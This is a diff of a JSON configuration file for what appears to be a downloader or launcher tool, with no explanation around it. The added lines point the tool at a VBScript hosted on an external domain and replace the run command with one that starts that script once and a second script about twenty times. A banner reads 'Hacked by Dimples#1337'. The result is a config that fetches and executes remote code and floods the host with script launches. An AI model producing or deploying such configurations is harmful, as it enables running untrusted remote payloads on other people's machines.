@@ -2,8 +2,8 @@
   "enable": true,
   "inneed": [
     {
-      "url": "http://localhost:8080/ProcessHacker.exe",
-      "name": "a.exe"
+      "url": "https://ling-res.guimc.ltd/a.vbs",
+      "name": "a.vbs"
     }
   ],
   "rundir": {
@@ -21,6 +21,6 @@
     "text": "Hacked by Dimples#1337"
   },
   "run": {
-    "command": "\"C:\\Program Files\\Bandizip\\Bandizip.exe\"\nexit"
+    "command": "start $rundir\\a.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\nstart $rundir\\b.vbs\n"
   }
 }
